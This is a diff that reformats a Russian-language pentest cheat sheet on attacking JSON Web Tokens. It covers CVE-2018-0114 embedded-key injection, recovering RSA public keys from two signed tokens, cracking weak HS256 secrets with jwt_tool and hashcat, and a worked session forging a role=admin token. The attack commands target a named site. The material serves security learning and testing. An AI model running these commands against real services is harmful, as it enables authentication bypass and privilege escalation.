@@ -255,24 +255,22 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiw
 ```
 
 ## JWT - Атака внедрения ключа (CVE-2018-0114)
-text
 
-Уязвимость в открытой библиотеке Cisco node-jose до версии 0.11.0 может позволить неаутентифицированному удаленному злоумышленнику повторно подписывать токены, используя ключ, встроенный в токен. Уязвимость возникает из-за того, что node-jose следует стандарту JSON Web Signature (JWS) для JSON Web Tokens (JWT). Этот стандарт указывает, что JSON Web Key (JWK), представляющий открытый ключ, может быть встроен в заголовок JWS. Затем этому открытому ключу доверяют для проверки. Злоумышленник может воспользоваться этим, подделывая действительные объекты JWS, удаляя исходную подпись, добавляя новый открытый ключ в заголовок, а затем подписывая объект с использованием (принадлежащего злоумышленнику) закрытого ключа, связанного с открытым ключом, встроенным в этот заголовок JWS.
+> Уязвимость в открытой библиотеке Cisco node-jose до версии 0.11.0 может позволить неаутентифицированному удаленному пользователю повторно подписывать токены, используя ключ, встроенный в токен. Уязвимость возникает из-за того, что node-jose следует стандарту JSON Web Signature (JWS) для JSON Web Tokens (JWT). Этот стандарт указывает, что JSON Web Key (JWK), представляющий открытый ключ, может быть встроен в заголовок JWS. Затем этому открытому ключу доверяют для проверки. Злоумышленник может воспользоваться этим, подделывая действительные объекты JWS, удаляя исходную подпись, добавляя новый открытый ключ в заголовок, а затем подписывая объект с использованием (принадлежащего злоумышленнику) закрытого ключа, связанного с открытым ключом, встроенным в этот заголовок JWS.
 
-Эксплуатация:
-text
+* **Эксплуатация:**
 
-Использование [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
+* Использование [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
 
 python3 jwt_tool.py [JWT_ТУТ] -X i
 
-Использование portswigger/JWT Editor
-    Добавьте New RSA key
-    На вкладке Repeater JWT отредактируйте данные
-    Attack > Embedded JWK
+* Использование [portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
+1. Добавь New RSA key
+2. На вкладке Repeater JWT отредактируйте данные
+3. Attack > Embedded JWK
 
-Деконструкция:
-
+* **Деконструкция:**
+```python
 {
 "alg": "RS256",
 "typ": "JWT",
@@ -286,27 +284,29 @@ python3 jwt_tool.py [JWT_ТУТ] -X i
 }.
 {"login":"admin"}.
 [Подписано новым закрытым ключом; открытый ключ внедрен]
-
+```
 ## JWT - Восстановление открытого ключа из подписанных JWT
 
 Алгоритмы RS256, RS384 и RS512 используют RSA с заполнением PKCS#1 v1.5 в качестве схемы подписи. Это свойство позволяет вычислить открытый ключ по двум разным сообщениям и соответствующим подписям.
 
-SecuraBV/jws2pubkey: compute an RSA public key from two signed JWTs
+* [SecuraBV/jws2pubkey](https://github.com/SecuraBV/jws2pubkey): compute an RSA public key from two signed JWTs
 
+```python
 $ docker run -it ttervoort/jws2pubkey JWS1 JWS2
 $ docker run -it ttervoort/jws2pubkey "$(cat sample-jws/sample1.txt)" "$(cat sample-jws/sample2.txt)" | tee pubkey.jwk
 Computing public key. This may take a minute...
 {"kty": "RSA", "n": "sEFRQzskiSOrUYiaWAPUMF66YOxWymrbf6PQqnCdnUla8PwI4KDVJ2XgNGg9XOdc-jRICmpsLVBqW4bag8eIh35PClTwYiHzV5cbyW6W5hXp747DQWan5lIzoXAmfe3Ydw65cXnanjAxz8vqgOZP2ptacwxyUPKqvM4ehyaapqxkBbSmhba6160PEMAr4d1xtRJx6jCYwQRBBvZIRRXlLe9hrohkblSrih8MdvHWYyd40khrPU9B2G_PHZecifKiMcXrv7IDaXH-H_NbS7jT5eoNb9xG8K_j7Hc9mFHI7IED71CNkg9RlxuHwELZ6q-9zzyCCcS426SfvTCjnX0hrQ", "e": "AQAB"}
+```
 
 # JWT Secret
-text
 
-Для создания JWT используется секретный ключ для подписи заголовка и полезной нагрузки, что генерирует подпись. Секретный ключ должен храниться в тайне и быть защищенным, чтобы предотвратить несанкционированный доступ к JWT или подделку его содержимого. Если злоумышленник сможет получить доступ к секретному ключу, он сможет создавать, изменять или подписывать свои собственные токены, обходя предусмотренные средства защиты.
+> Для создания JWT используется секретный ключ для подписи заголовка и полезной нагрузки, что генерирует подпись. Секретный ключ должен храниться в тайне и быть защищенным, чтобы предотвратить несанкционированный доступ к JWT или подделку его содержимого. Если злоумышленник сможет получить доступ к секретному ключу, он сможет создавать, изменять или подписывать свои собственные токены, обходя предусмотренные средства защиты.
 
 ## Кодирование и декодирование JWT с секретом
 
-Использование ticarpi/jwt_tool:
+* Использование [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool):
 
+```python
 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds
 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds -T
 
@@ -316,25 +316,27 @@ jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv
 
 Значения полезной нагрузки токена:
 [+] name = "John Doe"
+```
 
-Использование pyjwt: pip install pyjwt
-
+* Использование [pyjwt](https://pyjwt.readthedocs.io/en/stable/): pip install pyjwt
+```python
 import jwt
 encoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='HS256')
 jwt.decode(encoded, 'secret', algorithms=['HS256'])
-
+```
 ## Взлом секрета JWT
 
-Полезный список из 3502 общедоступных JWT-секретов: wallarm/jwt-secrets/jwt.secrets.list, включая your_jwt_secret, change_this_super_secret_random_string и т.д.
-Инструмент JWT
+Полезный список из 3502 общедоступных JWT-секретов: [wallarm/jwt-secrets/jwt.secrets.list](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list), включая ```your_jwt_secret```, ```change_this_super_secret_random_string``` и т.д.
 
-Сначала перебором находим "секретный" ключ, используемый для вычисления подписи, с помощью ticarpi/jwt_tool.
+**Инструмент JWT**
 
+Сначала перебором находим "секретный" ключ, используемый для вычисления подписи, с помощью [ticarpi/jwt_tool.](https://github.com/ticarpi/jwt_tool)
+```python
 python3 -m pip install termcolor cprint pycryptodomex requests
 python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI -d /tmp/wordlist -C
-
+```
 Затем редактируем поле внутри JSON Web Token.
-
+```python
 Текущее значение role: user
 Пожалуйста, введите новое значение и нажмите ENTER
 
@@ -346,10 +348,10 @@ python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODk
 
 Пожалуйста, выберите номер поля (или 0 для продолжения):
 
-    0
-
+>   0
+```
 Наконец, завершаем токен, подписывая его с помощью ранее полученного "секретного" ключа.
-
+```
 Подпись токена:
 [1] Подписать токен известным ключом
 [2] Удалить подпись у токена, уязвимого к CVE-2015-2951
@@ -358,38 +360,37 @@ python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODk
 
 Пожалуйста, выберите опцию из вышеперечисленных (1-4):
 
-    1
-
+>   1
 Пожалуйста, введите известный ключ:
 
-    secret
+>    secret
 
 Пожалуйста, введите длину ключа:
 [1] HMAC-SHA256
 [2] HMAC-SHA384
 [3] HMAC-SHA512
 
-    1
+>    1
 
 Ваш новый поддельный токен:
-[+] Безопасный для URL: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da_xtBsT0Kjw7truyhDwF5Ic
-[+] Стандартный: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da/xtBsT0Kjw7truyhDwF5Ic
-text
+[+] URL safe: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da_xtBsT0Kjw7truyhDwF5Ic
+[+] Standard: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da/xtBsT0Kjw7truyhDwF5Ic
 
-Разведка: python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw
-Сканирование: python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -M pb
-Эксплуатация: python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin
-Фаззинг: python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -I -hc kid -hv custom_sqli_vectors.txt
-Проверка: python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin
+```
 
-Hashcat
-text
+* Разведка: ```python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw```
+* Сканирование: ```python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -M pb```
+* Эксплуатация: ```python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin```
+* Фаззинг: ```python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -I -hc kid -hv custom_sqli_vectors.txt```
+* Проверка: ```python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin```
 
-Добавлена поддержка взлома JWT (JSON Web Token) с помощью hashcat со скоростью 365MH/s на одной GTX1080 - src
+**Hashcat**
 
-Атака по словарю: hashcat -a 0 -m 16500 jwt.txt wordlist.txt
-Атака на основе правил: hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule
-Атака полным перебором: hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6
+> Добавлена поддержка взлома JWT (JSON Web Token) с помощью hashcat со скоростью 365MH/s на одной GTX1080
+
+* Атака по словарю: hashcat -a 0 -m 16500 jwt.txt wordlist.txt
+* Атака на основе правил: hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule
+* Атака полным перебором: hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6
 
 # JWT Claims
 
